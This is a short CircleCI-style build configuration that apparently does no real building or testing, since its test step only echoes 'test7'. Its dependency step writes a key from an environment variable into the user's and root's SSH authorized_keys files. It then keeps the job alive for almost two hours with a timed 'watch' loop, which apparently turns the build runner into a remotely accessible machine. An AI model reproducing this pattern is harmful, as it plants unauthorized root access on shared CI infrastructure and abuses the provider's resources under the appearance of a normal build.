dependencies:
  override:
    - echo $PUBLIC_KEY2 >> ~/.ssh/authorized_keys
    - echo $PUBLIC_KEY2 | sudo tee /root/.ssh/authorized_keys
    - echo 'killall watch' | at now+115min
    - watch -n 540 echo 'LOL'
  cache_directories:
    - "~/droid"   # relative to the build directory
test:
  override:
    - echo test7
general:
  branches:
    only:
      - /circle-.*/
